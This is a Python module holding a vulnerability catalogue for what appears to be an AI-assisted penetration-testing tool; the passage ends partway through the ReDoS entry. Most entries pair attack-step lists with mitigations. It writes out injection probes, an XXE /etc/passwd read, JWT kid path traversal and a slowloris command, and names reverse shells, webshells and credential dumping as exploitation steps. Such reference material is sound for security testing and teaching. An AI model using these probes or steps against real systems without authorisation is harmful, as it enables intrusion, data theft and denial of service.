"""
Comprehensive vulnerability knowledge base.

Covers the full OWASP Top 10, the Web Security Academy catalogue, and
modern attack surface including API, mobile, IoT, and zero-day classes.
Every entry carries detection hints, exploitation strategy, and
mitigation notes so the model has real ammunition when reasoning about
a live target.

The database is intentionally plain Python -- dicts and lists are easier
to extend by hand than a YAML file when you are working offline.
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional


# Each vulnerability class is a dict with the following shape:
#   id             short slug used across the codebase
#   name           human-readable name
#   category       one of the 20 top-level groups
#   severity       typical severity when found in the wild
#   description    two to four sentence summary
#   detection      list of concrete ways to detect it
#   exploitation   list of concrete exploitation strategies
#   payloads       list of payload ids from the payload module
#   mitigation     defensive counterpart
#   references     external reading

VULNERABILITIES: List[Dict[str, Any]] = [

    # ============================================================
    # 1. INJECTION
    # ============================================================
    {
        "id": "sqli-union",
        "name": "SQL Injection (UNION-based)",
        "category": "Injection",
        "severity": "Critical",
        "description": (
            "Attacker injects a UNION SELECT to append rows from arbitrary "
            "tables to the original result set. The most reliable exfiltration "
            "path when column count and type match."
        ),
        "detection": [
            "Send ' UNION SELECT NULL-- and increment NULLs until no error",
            "Use ORDER BY N to binary-search column count quickly",
            "Watch for type mismatch errors that reveal column types",
            "Compare response byte length and row count before and after",
        ],
        "exploitation": [
            "Enumerate tables via information_schema.tables",
            "Dump columns via information_schema.columns",
            "Extract data via CONCAT and GROUP_CONCAT",
            "Chain into file-write when LOAD_FILE is not blocked",
        ],
        "payloads": ["sqli-union-mysql", "sqli-union-mssql", "sqli-union-postgres"],
        "mitigation": (
            "Prepared statements, parameterised queries, least-privilege DB "
            "accounts, and a WAF rule for UNION SELECT with version comments."
        ),
        "references": ["OWASP WSTG-INPV-05", "CWE-89"],
    },
    {
        "id": "sqli-blind",
        "name": "Blind SQL Injection",
        "category": "Injection",
        "severity": "High",
        "description": (
            "No direct output channel. Attacker infers data one bit at a time "
            "via boolean responses or time delays. Slower but equally "
            "impactful when the same DB account has file-write rights."
        ),
        "detection": [
            "Inject AND 1=1 / AND 1=2 and compare response bodies",
            "Inject SLEEP(5) and measure response time",
            "Inject pg_sleep(5) on PostgreSQL targets",
            "Inject WAITFOR DELAY '0:0:5' on MSSQL targets",
        ],
        "exploitation": [
            "Automate with sqlmap --technique=BT",
            "Use error-based fallback when time-based is blocked",
            "Leverage DNS out-of-band (sqlmap --dns-domain) when output is blind",
            "Chain to stacked queries for RCE on MSSQL/PostgreSQL",
        ],
        "payloads": ["sqli-time-mysql", "sqli-time-mssql", "sqli-oob-dns"],
        "mitigation": "Prepared statements, query timeouts, and WAF regex for SLEEP/WAITFOR.",
        "references": ["OWASP Blind SQLi", "CWE-89"],
    },
    {
        "id": "sqli-nosql",
        "name": "NoSQL Injection",
        "category": "Injection",
        "severity": "High",
        "description": (
            "MongoDB, CouchDB, and similar stores accept operator objects "
            "($ne, $gt, $where) that bypass authentication or extract data "
            "when the driver passes user input as a query object."
        ),
        "detection": [
            "Send {\"$ne\": null} on login endpoints",
            "Send {\"$gt\": \"\"} to bypass password check",
            "Test $where with a sleep() payload for blind",
            "Test JSON content-type vs form content-type",
        ],
        "exploitation": [
            "Bypass login with {\"$ne\": null}",
            "Extract user list with {\"$regex\": \"^a\"}",
            "Blind extract via $where sleep()",
            "Chain to prototype pollution on Node.js backends",
        ],
        "payloads": ["nosql-auth-bypass", "nosql-regex", "nosql-where-sleep"],
        "mitigation": "Validate input types, forbid operator objects, use ODM libraries.",
        "references": ["OWASP NoSQL Injection", "CWE-943"],
    },
    {
        "id": "xss-reflected",
        "name": "Reflected XSS",
        "category": "Injection",
        "severity": "Medium",
        "description": (
            "User input is echoed back in the response without encoding. "
            "Weaponised by tricking a victim into clicking a crafted URL "
            "that executes JavaScript in their session context."
        ),
        "detection": [
            "Inject a marker like apex<x> and check response body",
            "Check which characters are HTML-encoded vs raw",
            "Test context: HTML body, attribute, JS, CSS, URL",
            "Bypass CSP by looking for allowed script origins",
        ],
        "exploitation": [
            "Steal cookies when not HttpOnly",
            "Steal localStorage/sessionStorage tokens",
            "Force a password reset via fetch()",
            "Chain to CSRF for state-changing attacks",
        ],
        "payloads": ["xss-svg-onload", "xss-polyglot", "xss-csp-bypass"],
        "mitigation": "Context-aware output encoding, strict CSP, HttpOnly cookies.",
        "references": ["OWASP XSS", "CWE-79"],
    },
    {
        "id": "xss-stored",
        "name": "Stored XSS",
        "category": "Injection",
        "severity": "High",
        "description": (
            "Payload is persisted server-side (comment, profile, message) "
            "and executes for every viewer. Turns a single injection into a "
            "worm that spreads through the user base."
        ),
        "detection": [
            "Submit payload in every user-controlled field",
            "Revisit the page as a second user to confirm execution",
            "Check admin panels and support dashboards",
        ],
        "exploitation": [
            "Steal admin session and pivot to internal tooling",
            "Chain with CSRF to perform privileged actions as admin",
            "Deliver browser exploits (BeEF) for deeper compromise",
        ],
        "payloads": ["xss-mxss-dompurify", "xss-mutation", "xss-beef-hook"],
        "mitigation": "Server-side sanitisation (DOMPurify, sanitize-html) plus CSP.",
        "references": ["OWASP XSS", "CWE-79"],
    },
    {
        "id": "xss-dom",
        "name": "DOM-based XSS",
        "category": "Injection",
        "severity": "Medium",
        "description": (
            "Payload never touches the server. Client-side JavaScript reads "
            "attacker-controlled input (location.hash, window.name, "
            "document.referrer) and sinks it into innerHTML, eval, or src."
        ),
        "detection": [
            "Scan JS bundles for sources (location, postMessage) and sinks "
            "(innerHTML, document.write, eval)",
            "Use browser DevTools to trace data flow",
            "Fuzz fragment identifiers",
        ],
        "exploitation": [
            "Deliver via fragment identifier to bypass server-side WAF",
            "Chain with CSP weakness to load external scripts",
            "Combined with prototype pollution for gadget chains",
        ],
        "payloads": ["xss-dom-clobber", "xss-fragment"],
        "mitigation": "Trusted Types, textContent instead of innerHTML, CSP.",
        "references": ["OWASP DOM XSS", "CWE-79"],
    },
    {
        "id": "xss-mutation",
        "name": "Mutation XSS (mXSS)",
        "category": "Injection",
        "severity": "High",
        "description": (
            "Sanitiser removes the payload but the browser re-parses the "
            "remaining markup in a way that resurrects the script. Classic "
            "against older DOMPurify and sanitize-html builds."
        ),
        "detection": [
            "Test nested math, svg, mglyph, noscript tags",
            "Use known mXSS vectors from PortSwigger research",
        ],
        "exploitation": [
            "Bypass sanitizer then execute stored payload for all viewers",
        ],
        "payloads": ["xss-mxss-dompurify"],
        "mitigation": "Update DOMPurify, use Trusted Types, avoid DOM mutation sinks.",
        "references": ["Cure53 mXSS paper", "CVE-2020-26870"],
    },
    {
        "id": "csrf",
        "name": "Cross-Site Request Forgery",
        "category": "Injection",
        "severity": "High",
        "description": (
            "Attacker makes a victim's browser send an authenticated state-"
            "changing request (password reset, transfer, admin action) "
            "without the victim's awareness. Relies on ambient authentication."
        ),
        "detection": [
            "Remove CSRF token from request and replay",
            "Change token to a random value and check response",
            "Test same-site cookie attribute",
            "Test JSON-based CSRF (content-type bypass)",
        ],
        "exploitation": [
            "Auto-submit form to /admin/add-user",
            "Fetch-based CSRF when content-type is application/json",
            "Chain with XSS for forced actions",
        ],
        "payloads": ["csrf-html-form", "csrf-json-fetch"],
        "mitigation": "Per-request CSRF tokens, SameSite=Strict cookies, origin checks.",
        "references": ["OWASP CSRF", "CWE-352"],
    },
    {
        "id": "rce",
        "name": "Remote Code Execution",
        "category": "Injection",
        "severity": "Critical",
        "description": (
            "Attacker gets arbitrary code or shell commands executed on the "
            "target. The highest-impact outcome and usually the last hop of "
            "an exploit chain."
        ),
        "detection": [
            "Look for eval(), exec(), system(), popen() in source",
            "Test template engines with {{7*7}} style probes",
            "Test deserialization endpoints with ysoserial",
        ],
        "exploitation": [
            "Reverse shell to a controlled listener",
            "Stage a webshell for persistence",
            "Pivot into internal network",
        ],
        "payloads": ["rce-revshell-bash", "rce-revshell-python", "rce-revshell-powershell"],
        "mitigation": "Never eval user input, run in sandbox, use SELinux/AppArmor.",
        "references": ["CWE-94", "MITRE T1059"],
    },
    {
        "id": "cmd-injection",
        "name": "OS Command Injection",
        "category": "Injection",
        "severity": "Critical",
        "description": (
            "Application passes user input directly to a shell. Attacker "
            "appends ; | & $() or backticks to run arbitrary commands."
        ),
        "detection": [
            "Send ;id, |id, $(id), `id`, %0aid as parameter values",
            "Use time-based payloads (; sleep 5) when output is hidden",
            "Test blind via out-of-band DNS",
        ],
        "exploitation": [
            "Establish reverse shell",
            "Enumerate local users and privileges",
            "Dump credentials from config files",
        ],
        "payloads": ["cmd-semicolon", "cmd-pipe", "cmd-subshell", "cmd-oob"],
        "mitigation": "Avoid shell=True, use execve with argv arrays, input allowlist.",
        "references": ["OWASP Command Injection", "CWE-78"],
    },
    {
        "id": "ssti",
        "name": "Server-Side Template Injection",
        "category": "Injection",
        "severity": "Critical",
        "description": (
            "User input is concatenated into a template string. Attacker "
            "escapes into the template engine's runtime and often achieves "
            "full RCE (Jinja2, Twig, Freemarker, Velocity)."
        ),
        "detection": [
            "Send {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %> and check response",
            "Fingerprint engine via {{7*'7'}} output ('7777777' = Jinja2)",
            "Test payloads specific to Jinja2, Twig, Freemarker, Velocity",
        ],
        "exploitation": [
            "Escape Jinja2 sandbox via __subclasses__",
            "Twig RCE via filter('system')",
            "Freemarker ?new() gadget",
        ],
        "payloads": ["ssti-jinja2-rce", "ssti-twig-rce", "ssti-freemarker"],
        "mitigation": "Never concatenate user input into templates, use a sandbox.",
        "references": ["PortSwigger SSTI", "CWE-94"],
    },
    {
        "id": "ldap-injection",
        "name": "LDAP Injection",
        "category": "Injection",
        "severity": "High",
        "description": (
            "User input flows into an LDAP filter without escaping. Attacker "
            "can bypass authentication or enumerate directory contents."
        ),
        "detection": [
            "Send *)(uid=*))(|(uid=* and observe behaviour",
            "Test filter construction in login forms",
        ],
        "exploitation": [
            "Bypass authentication as any user",
            "Enumerate users, groups, and service accounts",
            "Reach AD CS or NTLM-relay primitives",
        ],
        "payloads": ["ldap-auth-bypass", "ldap-enum"],
        "mitigation": "Escape LDAP metacharacters, use bind authentication.",
        "references": ["OWASP LDAP Injection", "CWE-90"],
    },
    {
        "id": "xpath-injection",
        "name": "XPath Injection",
        "category": "Injection",
        "severity": "High",
        "description": (
            "User input flows into an XPath expression. Attacker can bypass "
            "auth or extract XML document contents via boolean blindness."
        ),
        "detection": [
            "Send ' or '1'='1 in XML-backed login forms",
            "Test boolean and time probes",
        ],
        "exploitation": [
            "Bypass auth with ' or '1'='1",
            "Extract document via count() and string-length()",
        ],
        "payloads": ["xpath-auth-bypass", "xpath-blind"],
        "mitigation": "Use XPath variables, escape quotes, never concatenate.",
        "references": ["OWASP XPath Injection", "CWE-643"],
    },
    {
        "id": "xml-injection",
        "name": "XML Injection",
        "category": "Injection",
        "severity": "Medium",
        "description": (
            "Attacker injects XML structure into a payload that is parsed "
            "server-side. Can bypass logic, tamper with data, or trigger XXE."
        ),
        "detection": [
            "Inject XML metacharacters < > & \" ' and check errors",
            "Test XML schema bypass in SOAP services",
        ],
        "exploitation": [
            "Inject extra elements to override logic",
            "Chain to XXE for file read",
        ],
        "payloads": ["xml-metachar-probe", "xml-extra-element"],
        "mitigation": "Disable external entities, use XML schema validation.",
        "references": ["OWASP XML Injection", "CWE-91"],
    },
    {
        "id": "xss-sql-polyglot",
        "name": "Cross-Context Polyglot Payload",
        "category": "Injection",
        "severity": "High",
        "description": (
            "Single payload that executes in HTML, JavaScript, attribute, "
            "and SQL contexts. Useful against WAFs that only inspect one "
            "layer of the stack."
        ),
        "detection": [
            "Submit to login, search, and reflection endpoints",
        ],
        "exploitation": [
            "Chain with SQLi for stacked outcomes",
            "Deliver via malicious form to a victim",
        ],
        "payloads": ["polyglot-heyes", "polyglot-xss-sql"],
        "mitigation": "Context-aware encoding plus CSP and WAF rules per context.",
        "references": ["Cure53 polyglot research"],
    },

    # ============================================================
    # 2. BROKEN AUTH & SESSION
    # ============================================================
    {
        "id": "session-fixation",
        "name": "Session Fixation",
        "category": "Broken Authentication",
        "severity": "High",
        "description": (
            "Attacker forces a known session ID on the victim, who then "
            "authenticates it. Attacker reuses the same ID to hijack the "
            "session."
        ),
        "detection": [
            "Set a session cookie before login and observe if it survives",
            "Compare cookie before and after authentication",
        ],
        "exploitation": [
            "Fix a token via URL and wait for victim login",
            "Chain with XSS for token injection",
        ],
        "payloads": ["session-fixation-url"],
        "mitigation": "Rotate session ID on login, bind to IP/UA fingerprint.",
        "references": ["OWASP Session Fixation", "CWE-384"],
    },
    {
        "id": "jwt-alg-none",
        "name": "JWT Algorithm Confusion (alg=none)",
        "category": "Broken Authentication",
        "severity": "Critical",
        "description": (
            "Server accepts tokens with alg=none and skips signature "
            "verification. Attacker forges tokens with arbitrary claims."
        ),
        "detection": [
            "Decode JWT and change alg to none, mixed case variants",
            "Remove signature segment entirely",
        ],
        "exploitation": [
            "Forge admin token with sub=admin",
            "Chain with IDOR for horizontal escalation",
        ],
        "payloads": ["jwt-none", "jwt-none-mixed"],
        "mitigation": "Reject alg=none, verify against allowlist of algorithms.",
        "references": ["PortSwigger JWT", "CWE-347"],
    },
    {
        "id": "jwt-hmac-confusion",
        "name": "JWT HMAC-to-RSA Confusion",
        "category": "Broken Authentication",
        "severity": "Critical",
        "description": (
            "Server uses HMAC verification but attacker signs with the "
            "public RSA key as the HMAC secret. Signatures verify against "
            "attacker-controlled data."
        ),
        "detection": [
            "Decode JWT header, note algorithm",
            "Attempt to sign with public key as HMAC secret",
        ],
        "exploitation": [
            "Forge token signed with public key",
            "Bypass privilege checks entirely",
        ],
        "payloads": ["jwt-hmac-confusion"],
        "mitigation": "Bind algorithm to key type, validate alg header.",
        "references": ["CVE-2016-5431", "CWE-347"],
    },
    {
        "id": "jwt-kid-injection",
        "name": "JWT kid Header Injection",
        "category": "Broken Authentication",
        "severity": "Critical",
        "description": (
            "The kid header is used to look up the signing key. When it is "
            "concatenated into a path or SQL query, attacker redirects to "
            "a predictable key (e.g. /dev/null) or injects SQL."
        ),
        "detection": [
            "Set kid to ../../../../dev/null and re-sign",
            "Set kid to SQL payload and observe errors",
        ],
        "exploitation": [
            "Sign with empty key when kid=dev/null",
            "SQLi via kid on MSSQL",
        ],
        "payloads": ["jwt-kid-traversal", "jwt-kid-sqli"],
        "mitigation": "Validate kid against a strict list, never concatenate.",
        "references": ["PortSwigger JWT", "CWE-22"],
    },
    {
        "id": "brute-force",
        "name": "Credential Brute Force / Stuffing",
        "category": "Broken Authentication",
        "severity": "High",
        "description": (
            "Automated guessing of passwords using wordlists, leaked "
            "credentials, or password spraying against many accounts."
        ),
        "detection": [
            "Test rate limiting on login endpoint",
            "Test account lockout policy",
            "Check for CAPTCHA bypass",
        ],
        "exploitation": [
            "Hydra / Burp Intruder with rockyou",
            "Password spraying with a single password across users",
            "Credential stuffing with public breach dumps",
        ],
        "payloads": ["brute-spray", "brute-rockyou"],
        "mitigation": "Rate limit, MFA, password blacklists (HIBP), lockout policy.",
        "references": ["OWASP Authentication Cheatsheet"],
    },
    {
        "id": "password-reset-flaws",
        "name": "Password Reset Flow Flaws",
        "category": "Broken Authentication",
        "severity": "High",
        "description": (
            "Reset tokens that are predictable, reusable, or hijackable via "
            "Host header, referer, or user enumeration."
        ),
        "detection": [
            "Test token reuse in parallel requests",
            "Test Host header injection in reset link",
            "Test user enumeration via timing and response size",
        ],
        "exploitation": [
            "Take over account via poisoned Host header",
            "Race two reset requests to reuse token",
        ],
        "payloads": ["reset-host-header", "reset-token-race"],
        "mitigation": "Cryptographically random tokens, one-time use, validate Host.",
        "references": ["OWASP Forgot Password", "CWE-640"],
    },
    {
        "id": "mfa-bypass",
        "name": "MFA Bypass",
        "category": "Broken Authentication",
        "severity": "Critical",
        "description": (
            "MFA can be bypassed via response manipulation, TOTP replay, "
            "push fatigue, or a fallback that skips MFA entirely."
        ),
        "detection": [
            "Intercept MFA response and flip success flag",
            "Replay a TOTP within its window",
            "Find /api/login-without-mfa fallback endpoints",
        ],
        "exploitation": [
            "Spam push notifications until fatigue (MFA fatigue)",
            "Bypass via response tampering in Burp",
            "Chain with OAuth consent phishing",
        ],
        "payloads": ["mfa-response-tamper", "mfa-push-fatigue"],
        "mitigation": "Server-side verification only, number-matching on push.",
        "references": ["MITRE T1621", "Uber MFA fatigue 2022"],
    },

    # ============================================================
    # 3. SENSITIVE DATA EXPOSURE
    # ============================================================
    {
        "id": "idor",
        "name": "Insecure Direct Object Reference",
        "category": "Sensitive Data Exposure",
        "severity": "High",
        "description": (
            "Application uses attacker-controllable identifiers to fetch "
            "resources without an ownership check. Classic horizontal "
            "escalation on /api/users/{id}."
        ),
        "detection": [
            "Change numeric IDs and observe access",
            "Try UUID-to-integer coercion",
            "Try ID swapping between two accounts",
        ],
        "exploitation": [
            "Enumerate /api/users/1..N",
            "Dump invoices, medical records, PII",
            "Chain into account takeover",
        ],
        "payloads": ["idor-numeric", "idor-uuid"],
        "mitigation": "Ownership checks on every object access (BOLA / OWASP API1).",
        "references": ["OWASP API1", "CWE-639"],
    },
    {
        "id": "missing-headers",
        "name": "Missing Security Headers",
        "category": "Sensitive Data Exposure",
        "severity": "Low",
        "description": (
            "CSP, HSTS, X-Frame-Options, X-Content-Type-Options, "
            "Referrer-Policy are absent, enabling clickjacking, MIME "
            "confusion, and downgrade attacks."
        ),
        "detection": [
            "curl -I target and inspect response headers",
            "Check for CSP allowing unsafe-inline or wildcards",
        ],
        "exploitation": [
            "Clickjacking via iframe",
            "MIME sniffing for XSS delivery",
        ],
        "payloads": ["clickjacking-iframe"],
        "mitigation": "Deploy all five standard headers, prefer CSP with nonce.",
        "references": ["OWASP Secure Headers Project"],
    },
    {
        "id": "file-handling",
        "name": "Insecure File Handling",
        "category": "Sensitive Data Exposure",
        "severity": "High",
        "description": (
            "Upload endpoints that trust filename, extension, or content-"
            "type. Path traversal lets attacker overwrite arbitrary files "
            "or achieve RCE via uploaded webshell."
        ),
        "detection": [
            "Upload shell.php.jpg and check execution",
            "Upload with ../../ in filename",
            "Upload with Content-Type: application/x-php",
        ],
        "exploitation": [
            "Write webshell to web root",
            "Overwrite SSH authorized_keys",
            "Chain with LFI for RCE",
        ],
        "payloads": ["upload-webshell", "upload-traversal"],
        "mitigation": "Server-side extension validation, store outside web root, disable execution.",
        "references": ["OWASP File Upload", "CWE-434"],
    },

    # ============================================================
    # 4. SECURITY MISCONFIGURATION
    # ============================================================
    {
        "id": "directory-listing",
        "name": "Directory Listing Enabled",
        "category": "Security Misconfiguration",
        "severity": "Medium",
        "description": (
            "Server returns an index of a directory instead of 403. Exposes "
            "backup files, source code, and admin panels."
        ),
        "detection": [
            "Request /uploads/, /backups/, /admin/ without trailing index",
        ],
        "exploitation": [
            "Harvest config.php.bak, .env, .git/",
            "Extract source for whitebox analysis",
        ],
        "payloads": ["dir-list-probe"],
        "mitigation": "Disable autoindex in nginx/apache, return 403 on directory.",
        "references": ["OWASP Directory Traversal"],
    },
    {
        "id": "default-creds",
        "name": "Default Credentials",
        "category": "Security Misconfiguration",
        "severity": "Critical",
        "description": (
            "Admin panels still running admin/admin, root/root, or vendor "
            "defaults. Common on IoT, printers, and NAS devices."
        ),
        "detection": [
            "Test admin/admin, admin/password, root/root",
            "Consult vendor docs for default creds",
            "Use hydra with default-creds.txt",
        ],
        "exploitation": [
            "Log in as admin, upload firmware or shell",
            "Extract device config with keys",
        ],
        "payloads": ["default-creds-list"],
        "mitigation": "Force password change on first boot, ship with random creds.",
        "references": ["CWE-1392"],
    },
    {
        "id": "cors-misconfig",
        "name": "CORS Misconfiguration",
        "category": "Security Misconfiguration",
        "severity": "High",
        "description": (
            "Server reflects Origin and sets "
            "Access-Control-Allow-Credentials: true. Attacker's origin can "
            "read authenticated responses."
        ),
        "detection": [
            "Send Origin: https://attacker.tld and inspect ACAO",
            "Test null origin",
            "Test subdomain wildcards",
        ],
        "exploitation": [
            "Steal API responses from victim browser",
            "Exfiltrate API keys and PII",
        ],
        "payloads": ["cors-null", "cors-reflect"],
        "mitigation": "Allowlist of trusted origins, never reflect null.",
        "references": ["PortSwigger CORS", "CWE-942"],
    },
    {
        "id": "api-endpoint-exposure",
        "name": "Unprotected API Endpoints",
        "category": "Security Misconfiguration",
        "severity": "High",
        "description": (
            "Internal or admin endpoints exposed without auth because they "
            "were never meant to be public. Discoverable via JS bundles, "
            "Swagger, or brute force."
        ),
        "detection": [
            "Fuzz /api/, /internal/, /v1/admin/",
            "Check /swagger.json, /openapi.json, /graphql",
            "Parse JS bundles for endpoint strings",
        ],
        "exploitation": [
            "Call /api/admin/users without auth",
            "Dump sensitive config from /internal/env",
        ],
        "payloads": ["api-endpoint-fuzz"],
        "mitigation": "Route-level auth, network ACL, prefix-based blocking.",
        "references": ["OWASP API9"],
    },

    # ============================================================
    # 5. XML-RELATED
    # ============================================================
    {
        "id": "xxe",
        "name": "XML External Entity Injection",
        "category": "XML-Related",
        "severity": "Critical",
        "description": (
            "Parser accepts external entities. Attacker reads local files, "
            "performs SSRF, or achieves RCE via PHP expect:// or Java "
            "deserialization chains."
        ),
        "detection": [
            "Send DOCTYPE with SYSTEM file:///etc/passwd",
            "Test out-of-band DTD with Burp Collaborator",
            "Test SOAP, SAML, SVG, and DOCX upload endpoints",
        ],
        "exploitation": [
            "Read /etc/passwd, /etc/shadow, config files",
            "SSRF into internal metadata services",
            "Chain to RCE via PHP filter chain",
        ],
        "payloads": ["xxe-file", "xxe-oob", "xxe-php-filter"],
        "mitigation": "Disable external entities, use defusedxml, validate DTD.",
        "references": ["OWASP XXE", "CWE-611"],
    },
    {
        "id": "xml-bomb",
        "name": "XML Entity Expansion / Billion Laughs",
        "category": "XML-Related",
        "severity": "Medium",
        "description": (
            "Recursive entity expansion exhausts memory, causing DoS. Also "
            "known as a billion laughs attack."
        ),
        "detection": [
            "Send a small recursive entity payload",
            "Monitor server memory usage",
        ],
        "exploitation": [
            "DoS a document-processing endpoint",
            "Combine with XXE for OOB amplification",
        ],
        "payloads": ["xxe-billion-laughs"],
        "mitigation": "Limit entity expansion, disable DTDs.",
        "references": ["CWE-776"],
    },

    # ============================================================
    # 6. BROKEN ACCESS CONTROL
    # ============================================================
    {
        "id": "bfla",
        "name": "Broken Function-Level Authorization",
        "category": "Broken Access Control",
        "severity": "High",
        "description": (
            "UI hides admin buttons but API does not enforce the check. "
            "Attacker calls the API directly and performs admin actions."
        ),
        "detection": [
            "Enumerate /admin/* endpoints with regular user token",
            "Diff UI-visible routes vs JS bundle routes",
            "Test HTTP verb tampering on admin routes",
        ],
        "exploitation": [
            "Delete users via /api/admin/users/{id}",
            "Change other users' roles",
        ],
        "payloads": ["bfla-admin-call"],
        "mitigation": "Enforce server-side RBAC per route, not per UI element.",
        "references": ["OWASP API5", "CWE-285"],
    },
    {
        "id": "force-browsing",
        "name": "Forceful Browsing",
        "category": "Broken Access Control",
        "severity": "Medium",
        "description": (
            "Attacker guesses URLs to reach resources that are not linked in "
            "the UI but still exist and lack auth."
        ),
        "detection": [
            "Use dirsearch / feroxbuster with big lists",
            "Fuzz /admin, /backup, /internal",
        ],
        "exploitation": [
            "Reach admin panel without auth",
            "Download backup archives",
        ],
        "payloads": ["force-browse-list"],
        "mitigation": "Require auth on every route, remove orphan routes.",
        "references": ["OWASP WSTG-ATHZ"],
    },

    # ============================================================
    # 7. INSECURE DESERIALIZATION
    # ============================================================
    {
        "id": "deser-java",
        "name": "Java Deserialization RCE",
        "category": "Insecure Deserialization",
        "severity": "Critical",
        "description": (
            "ObjectInputStream.readObject on untrusted data with a gadget "
            "chain on the classpath (CommonsCollections, Spring, Groovy) "
            "yields RCE."
        ),
        "detection": [
            "Look for rO0AB (base64 of 0xACED) in cookies or bodies",
            "Fingerprint libraries via ysoserial",
        ],
        "exploitation": [
            "ysoserial CommonsCollections6 for RCE",
            "URLDNS probe for blind detection",
            "Chain with JNDI for log4shell-style impact",
        ],
        "payloads": ["deser-ysoserial-cc6", "deser-urldns"],
        "mitigation": "Whitelist allowed classes, use ObjectInputFilter.",
        "references": ["CWE-502", "Ysoserial"],
    },
    {
        "id": "deser-python",
        "name": "Python Pickle RCE",
        "category": "Insecure Deserialization",
        "severity": "Critical",
        "description": (
            "pickle.loads on untrusted data executes __reduce__ gadgets. "
            "Common in Redis sessions, ML pipelines, and Celery workers."
        ),
        "detection": [
            "Look for base64 starting with gASV in cookies",
            "Fingerprint pickled payloads with pickletools",
        ],
        "exploitation": [
            "Class with __reduce__ returning os.system",
            "Reverse shell via subprocess.Popen",
        ],
        "payloads": ["deser-pickle-rce"],
        "mitigation": "Never unpickle untrusted data, use json or msgpack.",
        "references": ["CWE-502"],
    },
    {
        "id": "deser-php",
        "name": "PHP Object Injection",
        "category": "Insecure Deserialization",
        "severity": "Critical",
        "description": (
            "unserialize on user input combined with a POP chain in loaded "
            "classes leads to RCE, file write, or SQLi."
        ),
        "detection": [
            "Look for O: or a: in cookies or serialized parameters",
            "Fingerprint framework (Laravel, Symfony, WordPress)",
        ],
        "exploitation": [
            "Craft POP chain via __destruct / __wakeup",
            "Chain to file write or SQLi",
        ],
        "payloads": ["deser-php-pop"],
        "mitigation": "Use json_decode, never unserialize user data.",
        "references": ["CWE-502"],
    },

    # ============================================================
    # 8. API SECURITY
    # ============================================================
    {
        "id": "api-rate-limit",
        "name": "Missing Rate Limiting",
        "category": "API Security",
        "severity": "Medium",
        "description": (
            "Sensitive endpoints (login, OTP, reset) accept unlimited "
            "requests, enabling brute force and cost-based DoS."
        ),
        "detection": [
            "Send 100 rapid requests to /login and measure success",
            "Check for 429 / Retry-After response",
        ],
        "exploitation": [
            "Brute force OTP (6 digits = 1M attempts)",
            "Cost exhaustion on paid API endpoints",
        ],
        "payloads": ["ratelimit-otp-brute"],
        "mitigation": "Per-IP and per-user token bucket, exponential backoff.",
        "references": ["OWASP API4"],
    },
    {
        "id": "graphql-introspection",
        "name": "GraphQL Introspection Enabled",
        "category": "API Security",
        "severity": "Medium",
        "description": (
            "Full schema introspection available in production. Reveals "
            "every type, mutation, and internal field."
        ),
        "detection": [
            "Send {__schema{types{name}}} query",
            "Use InQL / graphql-voyager for visualisation",
        ],
        "exploitation": [
            "Discover hidden mutations",
            "Enumerate ID fields for IDOR",
        ],
        "payloads": ["graphql-introspect"],
        "mitigation": "Disable introspection in prod, use allowlisted queries.",
        "references": ["OWASP GraphQL Cheatsheet"],
    },
    {
        "id": "graphql-batching",
        "name": "GraphQL Query Batching Abuse",
        "category": "API Security",
        "severity": "High",
        "description": (
            "Alias-based batching lets attacker send 1000 queries in one "
            "request, bypassing rate limits and enabling brute force."
        ),
        "detection": [
            "Send query with 100 aliases of the same field",
            "Measure response size and rate limits",
        ],
        "exploitation": [
            "Brute force OTP via aliases",
            "Enumerate users en masse",
        ],
        "payloads": ["graphql-alias-batch"],
        "mitigation": "Limit query depth and total aliases per request.",
        "references": ["PortSwigger GraphQL"],
    },

    # ============================================================
    # 9. INSECURE COMMUNICATION
    # ============================================================
    {
        "id": "tls-misconfig",
        "name": "Weak TLS Configuration",
        "category": "Insecure Communication",
        "severity": "Medium",
        "description": (
            "TLS 1.0/1.1 enabled, weak ciphers, or missing HSTS. Allows "
            "downgrade and MITM."
        ),
        "detection": [
            "Run testssl.sh or sslyze",
            "Check HSTS header presence",
        ],
        "exploitation": [
            "SSL strip for credential theft",
            "Downgrade attack on internal traffic",
        ],
        "payloads": ["tls-testssl"],
        "mitigation": "TLS 1.2+, strong ciphers only, HSTS with long max-age.",
        "references": ["CWE-326"],
    },

    # ============================================================
    # 10. CLIENT-SIDE
    # ============================================================
    {
        "id": "clickjacking",
        "name": "Clickjacking",
        "category": "Client-Side",
        "severity": "Medium",
        "description": (
            "Target page is iframable. Attacker overlays it with a decoy "
            "and tricks the victim into clicking privileged buttons."
        ),
        "detection": [
            "Check for X-Frame-Options and frame-ancestors CSP",
            "Try iframing the target",
        ],
        "exploitation": [
            "Frame the admin panel and overlay a decoy",
            "Trick user into clicking 'Add User' or 'Transfer'",
        ],
        "payloads": ["clickjacking-iframe"],
        "mitigation": "X-Frame-Options: DENY, CSP frame-ancestors 'none'.",
        "references": ["CWE-1021"],
    },
    {
        "id": "postmessage-hijack",
        "name": "Insecure postMessage",
        "category": "Client-Side",
        "severity": "High",
        "description": (
            "Window.postMessage handler does not validate event.origin, "
            "letting any attacker page send messages that change state."
        ),
        "detection": [
            "Grep JS for addEventListener('message')",
            "Test cross-origin messages from an attacker page",
        ],
        "exploitation": [
            "Force logout, token reset, or account change",
            "Trigger privileged actions cross-origin",
        ],
        "payloads": ["postmessage-origin-bypass"],
        "mitigation": "Always validate event.origin against an allowlist.",
        "references": ["CWE-346"],
    },

    # ============================================================
    # 11. DOS
    # ============================================================
    {
        "id": "slowloris",
        "name": "Slowloris / Slow POST DoS",
        "category": "Denial of Service",
        "severity": "Medium",
        "description": (
            "Attacker holds many half-open connections with slow headers, "
            "exhausting the server's connection pool."
        ),
        "detection": [
            "Check connection limits per IP",
            "Test with slowhttptest",
        ],
        "exploitation": [
            "slowhttptest -c 1000 -H -g -o slowloris",
            "Combine with slow POST for amplification",
        ],
        "payloads": ["dos-slowloris"],
        "mitigation": "Timeout on headers, per-IP connection cap, reverse proxy.",
        "references": ["CWE-400"],
    },
    {
        "id": "regex-dos",
        "name": "Regular Expression DoS (ReDoS)",
        "category": "Denial of Service",
        "severity": "Medium",
        "description": (
            "Catastrophic backtracking in user-validated regex causes CPU "
            "exhaustion with a small input."
        ),
        "detection": [
            "Fuzz input with long repetitions of a repeated character",
            "Time responses with short vs long input",
        ],
        "exploitation": [
            "Send 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' to trigger backtracking",
            "Target email / URL validation regexes",
        ],
        "payloads": ["dos-redos"],
